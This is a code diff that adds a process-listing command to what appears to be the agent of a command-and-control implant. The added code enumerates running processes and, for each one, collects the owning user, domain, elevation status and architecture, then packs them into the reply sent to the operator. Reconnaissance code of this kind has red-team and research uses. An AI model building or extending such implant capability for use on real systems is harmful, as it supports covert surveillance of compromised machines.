@@ -38,6 +38,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_PROFILE:
 			this->CmdProfile(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_PS_LIST:
+			this->CmdPsList(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_PWD:       
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
 		
@@ -275,6 +278,134 @@ void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacke
 	agent->config->exit_method  = inPacker->Unpack32();
 	agent->config->exit_task_id = inPacker->Unpack32();
 	agent->SetActive(false);
+}
+
+void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+
+	PSYSTEM_PROCESS_INFORMATION spi = NULL, spiAddr = NULL;
+
+	ULONG spiSize = 0;
+	NTSTATUS NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
+	if ( !NT_SUCCESS(NtStatus) ) {
+		spiSize += 0x1000;
+		spi = (PSYSTEM_PROCESS_INFORMATION) MemAllocLocal(spiSize);
+		if (spi)
+			NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
+	}
+	spiAddr = spi;
+
+	if (NT_SUCCESS(NtStatus)) {
+		outPacker->Pack8(TRUE);
+		ULONG count = 0;
+		ULONG indexCount = outPacker->GetDataSize();
+		outPacker->Pack32(0);
+
+		DWORD accessMask = 0;
+		if ( agent->info->major_version == 5 && agent->info->minor_version == 1 )
+			accessMask = PROCESS_QUERY_INFORMATION;
+		else
+			accessMask = PROCESS_QUERY_LIMITED_INFORMATION;
+
+		do {
+			BOOL  elevated = FALSE;
+			BYTE  arch64   = 10;
+			CHAR  processName[260] = { 0 };
+			ULONG usernameSize = MAX_PATH;
+			CHAR  username[MAX_PATH] = { 0 };
+			ULONG domainSize = MAX_PATH;
+			CHAR  domain[MAX_PATH]   = { 0 };
+
+			OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
+			InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);
+
+			BOOL      result   = FALSE;
+			HANDLE    hToken   = NULL;
+			HANDLE    hProcess = NULL;
+			CLIENT_ID clientId = { spi->UniqueProcessId, 0 };
+			NtStatus = ApiNt->NtOpenProcess(&hProcess, accessMask, &ObjectAttr, &clientId);
+			if ( NT_SUCCESS(NtStatus) ) {
+
+				ULONG_PTR piWow64 = NULL;
+				NtStatus = ApiNt->NtQueryInformationProcess(hProcess, ProcessWow64Information, &piWow64, sizeof(ULONG_PTR), NULL);
+				if (NT_SUCCESS(NtStatus))
+					arch64 = (piWow64 == 0);
+
+				NtStatus = ApiNt->NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
+				if( NT_SUCCESS(NtStatus) ) {
+
+					if (hToken) {
+						LPVOID tokenInfo     = NULL;
+						DWORD  tokenInfoSize = 0;
+						result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, 0, &tokenInfoSize);
+						if (!result) {
+							tokenInfo = MemAllocLocal(tokenInfoSize);
+							if (tokenInfo)
+								result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize);
+						}
+
+						TOKEN_ELEVATION Elevation = { 0 };
+						DWORD eleavationSize = sizeof(TOKEN_ELEVATION);
+						ApiWin->GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &eleavationSize);
+
+						if (result) {
+							SID_NAME_USE SidType;
+							result = ApiWin->LookupAccountSidA(NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, username, &usernameSize, domain, &domainSize, &SidType);
+							if (result) {
+								elevated = Elevation.TokenIsElevated;
+							}
+						}
+					}
+				}
+			}
+
+			if (spi->ImageName.Buffer) {
+
+				ConvertUnicodeStringToChar(spi->ImageName.Buffer, spi->ImageName.Length, processName, sizeof(processName));
+
+				outPacker->Pack16((WORD)spi->UniqueProcessId);
+				outPacker->Pack16((WORD)spi->InheritedFromUniqueProcessId);
+				outPacker->Pack16((WORD)spi->SessionId);
+				outPacker->Pack8(arch64);
+				outPacker->Pack8(elevated);
+				outPacker->PackStringA(domain);
+				outPacker->PackStringA(username);
+				outPacker->PackStringA(processName);
+
+				count++;
+
+				memset(processName, 0, spi->ImageName.Length / 2);
+				memset(username, 0, usernameSize);
+				memset(domain, 0, domainSize);
+			}
+
+			if (hProcess) {
+				ApiNt->NtClose(hProcess);
+				hProcess = NULL;
+			}
+			if (hToken) {
+				ApiNt->NtClose(hToken);
+				hToken = NULL;
+			}
+
+			if ( !spi->NextEntryOffset ) 
+				break;
+			spi = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
+		} while ( TRUE );
+
+		if (spiAddr)
+			MemFreeLocal((LPVOID*)&spiAddr, spiSize);
+
+		outPacker->Set32(indexCount, count);
+	}
+	else {
+		outPacker->Pack8(TRUE);
+		outPacker->Pack32(87);
+	}
 }
 
 void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
